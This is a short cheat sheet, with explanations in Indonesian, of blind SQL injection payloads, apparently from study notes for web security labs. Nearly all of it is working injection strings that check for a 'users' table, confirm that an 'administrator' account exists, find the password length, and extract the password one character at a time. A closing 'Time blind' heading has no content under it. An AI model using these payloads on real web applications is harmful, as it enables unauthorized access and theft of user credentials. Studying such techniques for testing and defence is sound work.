# 1. Error blind

  - ## i. check table name
        ' AND (SELECT 'a' FROM users LIMIT 1)='a
  - ## ii. check particular user if exist in users table
        ' AND (SELECT 'a' FROM users where username = 'administrator')='a
  - ## iii. Check specific column information
        ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) = 20)='a
  - ## iv. Dump table
        ' AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')='a
        ' AND (SELECT substring(password,2,1) FROM users WHERE username='administrator')='a
    substring(password,1,1) = Mengambil 1 karakter di urutan pertama
    
    substring(password,2,1) = Mengambil 1 karakter di urutan kedua
    
    substring(password,3,1) = Mengambil 1 karakter di urutan ketiga
    
    substring(password,4,1) = Mengambil 1 karakter di urutan keempat
    
    1 di bagian akhir memastikan bahwa sistem hanya mengambil tepat satu huruf saja pada posisi tersebut untuk dicocokkan. 
       

# 2. Time blind
